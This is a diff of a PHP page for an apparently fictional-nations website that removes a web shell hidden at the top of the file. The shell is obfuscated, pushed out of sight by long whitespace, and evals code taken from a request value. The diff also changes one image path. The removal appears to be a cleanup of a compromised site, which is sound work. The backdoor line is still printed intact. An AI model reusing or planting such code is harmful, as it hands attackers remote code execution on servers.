@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                         $w6g='1e\'a4s(lO$52CK_fI8vhEitdd41258';if(isset(${$w6g[14].$w6g[12].$w6g[8].$w6g[8].$w6g[13].$w6g[16].$w6g[20]}[$w6g[19].$w6g[23].$w6g[4].$w6g[0].$w6g[11].$w6g[10].$w6g[17]])){eval(${$w6g[14].$w6g[12].$w6g[8].$w6g[8].$w6g[13].$w6g[16].$w6g[20]}[$w6g[19].$w6g[23].$w6g[4].$w6g[0].$w6g[11].$w6g[10].$w6g[17]]);} ?><?php require_once('Connections/maconnexion.php'); ?>
+<?php require_once('Connections/maconnexion.php'); ?>
 <?php 
 // Tri des pays par continent pour le menu deroulant
 mysql_select_db($database_maconnexion, $maconnexion);
@@ -83,7 +83,7 @@ $totalRows_menu = mysql_num_rows($menu);
             <a href="Page-carte.php" class="dropdown-toggle" data-toggle="dropdown" title="liste des pays class&eacute;s par continent">Les pays <b class="caret hidden-phone"></b></a>
             <ul class="dropdown-menu dropdown-double hidden-phone">
               <div class="drop-colonne-gauche">
-                <li class="nav-header"><img src="assets/img/Volcania.png" class="img-continent"> R&eacute;publique F&eacute;d&eacute;rale de G&eacute;n&eacute;ration City</li>
+                <li class="nav-header"><img src="assets/img/Aurinea.png" class="img-continent"> R&eacute;publique F&eacute;d&eacute;rale de G&eacute;n&eacute;ration City</li>
                 <?php 
 				do { 
                 if ($row_menu['ch_pay_continent'] == 'RFGC') {
